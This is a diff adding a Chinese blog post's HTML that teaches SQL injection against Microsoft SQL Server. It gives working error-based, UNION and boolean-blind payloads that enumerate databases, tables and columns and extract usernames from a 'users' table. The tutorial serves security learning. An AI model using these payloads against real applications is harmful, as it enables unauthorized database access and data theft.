@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="/img/marmot.jpg">
+    <link rel="alternate" type="application/atom+xml" title="marmot" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        mssql数据库注入---marmot`s Blog｜marmot&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.marmot.vip/mssql/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('img/back.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    marmot
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/work/">work</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="undefinedimg/back2.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('img/back2.jpgundefined')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>mssql数据库注入---marmot`s Blog</h1>
+                    
+                    <h2 class="subheading">狎兴生疏，酒徒萧索，不似少年时。</h2>
+                    
+                    <span class="meta">
+                         作者 marmot
+                        <span>
+                          日期 2021-07-17
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#sql注入"
+                           title="sql注入">sql注入</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            mssql数据库注入---marmot`s Blog
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h3 id="Msqql简介"><a href="#Msqql简介" class="headerlink" title="Msqql简介"></a>Msqql简介</h3><p>​        Mssql数据库是指微软公司的SQLServer数据库服务器，这是一个数据平台，提供数据库的从服务到终端的完整解决方案，其中数据库服务器部分是一个数据库管理系统，用于建立、使用和维护数据库。</p>
+<p>​        在Msqql数据库中，默认存放了四个数据库，分别为：master、model、tempdb以及msdb。</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>master</td>
+<td>控制sqlserver的所有</td>
+</tr>
+<tr>
+<td>model</td>
+<td>建立所有用户数据库的模板</td>
+</tr>
+<tr>
+<td>tempdb</td>
+<td>存放临时表</td>
+</tr>
+<tr>
+<td>msdb</td>
+<td>存储任务计划信息、时间处理信息、数据备份以及恢复信息</td>
+</tr>
+</tbody></table>
+<p>​                                                基本语句</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>创建数据库</td>
+<td>CREATE DATABASE [dbname]</td>
+</tr>
+<tr>
+<td>删除数据库</td>
+<td>DROP DATABASE [dbname]</td>
+</tr>
+<tr>
+<td>创建新表</td>
+<td>CREATE TABLE [tablename] (column_name type)</td>
+</tr>
+<tr>
+<td>删除表</td>
+<td>DROP TABLE [table_name]</td>
+</tr>
+<tr>
+<td>向表中插入内容</td>
+<td>INSERT INTO [tb_name](column1,column2) VALUES(value1,value2)</td>
+</tr>
+<tr>
+<td>删除内容</td>
+<td>DELETE FROM [tb_name] WHERE condition(条件)</td>
+</tr>
+<tr>
+<td>更新内容</td>
+<td>UPDATE [tb_name] set column_name=value where [condition]</td>
+</tr>
+<tr>
+<td>查找数据</td>
+<td>SELECT * FROM tb_name WHERE [conditon]</td>
+</tr>
+</tbody></table>
+<p>其他信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注释： --  /**/</span><br><span class="line">时间延时：WAITFOR DELAY &#x27;0:0:0&#x27;</span><br><span class="line">联合查询：UNION SELECT </span><br><span class="line">当前数据库名称：db_name()</span><br><span class="line">当前数据库用户名：user_name()</span><br><span class="line">版本信息：@@version</span><br><span class="line">判断当前用户的权限：IS_SRVROLEMEMBER(&#x27;XXX&#x27;)</span><br><span class="line">\\sysamdin:数据库管理员</span><br><span class="line">\\db_owner:当前数据库写入、读取文件的权限</span><br><span class="line">\\public:判断是否有public权限，可以爆破表</span><br></pre></td></tr></table></figure>
+
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>​        数据库注入为网站后端语言在构造sql语句的时候未将参数进行验证与格式化，从而使拼接参数的sql语句变成了恶意sql语句而从而导致数据库的信息暴露或者插入了恶意数据，造成了数据的泄露或者写入了网站木马。</p>
+<p>​        Mssql数据库原理：利用了在使用and 语句后使用数值在与字符型数据进行比较的时候无法将字符型数据进行INT转换而显示了语句错误导致数据信息的泄露</p>
+<h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h4><ol>
+<li><p>判断语句闭合类型</p>
+<p>payload：<code>?id=1&#39; and 1=1 -- </code></p>
+<p><img src="/mssql/image-20210717090817050.png" alt="image-20210717090817050"></p>
+</li>
+<li><p>判断数据库类型</p>
+<p>payload：<code>?id=1&#39; and exists(select * from sysobjects)--</code></p>
+<p><img src="/mssql/image-20210717091158742.png" alt="image-20210717091158742"></p>
+</li>
+<li><p>获取当前用户信息</p>
+<p>payload：<code>?id=1&#39; and 1&lt;(user_name())--</code></p>
+<p><img src="/mssql/image-20210717091317920.png" alt="image-20210717091317920"></p>
+</li>
+<li><p>获取当前数据库</p>
+<p>payload：<code>?id=1&#39; and 1&lt;(db_name())--</code></p>
+<p><img src="/mssql/image-20210717091503368.png" alt="image-20210717091503368"></p>
+</li>
+<li><p>判断当前用户的权限</p>
+<p>payload：<code>?id=1&#39; and 1=(select is_srvrolemember(&#39;sysadmin&#39;))-- </code>   </p>
+<p><img src="/mssql/image-20210717091717359.png" alt="image-20210717091717359"></p>
+</li>
+<li><p>查看数据库的数量</p>
+<p>payload：</p>
+<p><code>?id=1&#39; and 1=(&#39;~&#39;%2b(convert(varchar(255),(select count(*) from master.dbo.sysdatabases)))) --</code></p>
+<p><img src="/mssql/image-20210717095235213.png" alt="image-20210717095235213"></p>
+</li>
+<li><p>查看数据库</p>
+<p>payload：</p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 name from Master.dbo.SysDatabases)--    </code></p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 name from Master.dbo.SysDatabases where name not in (select top 1 name from master.dbo.sysdatabases))-- </code></p>
+<p><code>?id=1&#39; and 1&lt;(&#39;~&#39; %2b (select top 1 name from master.dbo.sysdatabases)%2b&#39;~&#39;)-- </code>\\使用在数据名为数值类型时使用~进行拼接导致无法转换为int类型</p>
+<p><code>?id=1&#39; and (convert(int,db_name(A)))&gt;0 --</code> \\更换A的数值即可</p>
+<p>\\ top 为查看前几 </p>
+<p>\\convert(type,data)//将data转换为指定类型</p>
+<p><img src="/mssql/image-20210717092421038.png" alt="image-20210717092421038"></p>
+</li>
+<li><p>查看当前数据库中的表</p>
+<p>payload：</p>
+<p><code>id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables)-- </code></p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))</code> //查看其他表</p>
+<p>在information_schema.tables前添加<code>库名..</code>查看其他库中的表</p>
+<p><img src="/mssql/image-20210717095607796.png" alt="image-20210717095607796"></p>
+</li>
+<li><p>判断表中字段数量</p>
+<p>payload：</p>
+<p><code>?id=1&#39; and 1&lt;(select count(column_name) FROM information_schema.columns where table_name = &#39;users&#39;) --</code></p>
+<p><img src="/mssql/image-20210717095935950.png" alt="image-20210717095935950"></p>
+</li>
+<li><p>查看字段名</p>
+<p>payload：</p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 column_name FROM information_schema.columns where table_name = &#39;users&#39;) --  </code></p>
+<p><code>id=1&#39; and 1&lt;(select top 1 column_name FROM information_schema.columns where table_name = &#39;users&#39; and column_name not in (select top 1 column_name FROM information_schema.columns where table_name = &#39;users&#39; )) --  </code> \\查看其他字段</p>
+<p><img src="/mssql/image-20210717100054501.png" alt="image-20210717100054501"></p>
+</li>
+<li><p>查看具体数据</p>
+<p>payload：</p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 username from test..users) --  </code></p>
+<p><code>?id=1&#39; and 1&lt;(select top 1 username from test..users where username not in (select top 1 username from test..users)) --  </code> \\查看其他的数据值</p>
+<p><img src="/mssql/image-20210717100356955.png" alt="image-20210717100356955"></p>
+</li>
+</ol>
+<h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h5><ol>
+<li><p>判断列数</p>
+<p>payload:<code>?id=1&#39; order by 4 --</code></p>
+<p><img src="/mssql/image-20210717100711551.png" alt="image-20210717100711551"></p>
+</li>
+<li><p>判断显示位</p>
+<p>payload：</p>
+<p><code>?id=-1&#39; union select  1,2,3 --</code></p>
+<p><img src="/mssql/image-20210717100825382.png" alt="image-20210717100825382"></p>
+</li>
+<li><p>利用显示位显示具体信息</p>
+<p>payload：</p>
+<p><code>?id=-1&#39; union select  1,db_name(),@@version --</code></p>
+<p><img src="/mssql/image-20210717100942536.png" alt="image-20210717100942536"></p>
+</li>
+</ol>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h5><p>布尔盲注使用在没有显示位或者没有报错注入的时候。使用ascii以及substring函数判断字符的个位数的ascii码，从而获取具体信息</p>
+<p>payload:</p>
+<p>cast方法是为了将str（某些数据可能本身为数值）转换为字符串形式</p>
+<p><code>?id=1&#39; and ascii(substring(cast(str as nvarchar(4000)),1,1))&gt;11--   </code></p>
+<p><img src="/mssql/image-20210717101623336.png" alt="image-20210717101623336"></p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/Oracle/" data-toggle="tooltip" data-placement="top"
+                           title="Oracle数据库注入">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/test/" data-toggle="tooltip" data-placement="top"
+                           title="mongodb数据库mongod启动返回码100解决">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+                    <!-- Valine -->
+                    <div class="vcomments"></div>
+                    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+                    <script src="//cdn.jsdelivr.net/npm/valine"></script>
+                    <script>
+                        var GUEST = ['nick','mail','link'];
+                        var meta = '';
+                        meta = meta.split(',').filter(function (item) {
+                            return GUEST.indexOf(item)>-1;
+                        });
+                        var notify = 'false' == true ? true : false;
+                        var verify = 'false' == true ? true : false;
+                        new Valine({
+                            el: '.vcomments',
+                            notify: notify,
+                            verify: verify,
+                            app_id: "oE8RJ9DO5Tl7ChTtMFwgLKIg-gzGzoHsz",
+                            app_key: "mUbPBB3Wq3R6wX9ysIlescWj",
+                            placeholder: "评论一下",
+                            avatar:"mm",
+                            meta:meta
+                        });
+                    </script>
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msqql%E7%AE%80%E4%BB%8B"><span class="toc-text">Msqql简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#sql注入"
+                           title="sql注入">sql注入</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.zerochen.top">墨的博客</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.sunflowers.vip">sunflowers的博客</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/mar-mot">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; marmot 2021
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.marmot.vip/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="/img/marmot.jpg">
+</body>
+
+</html>
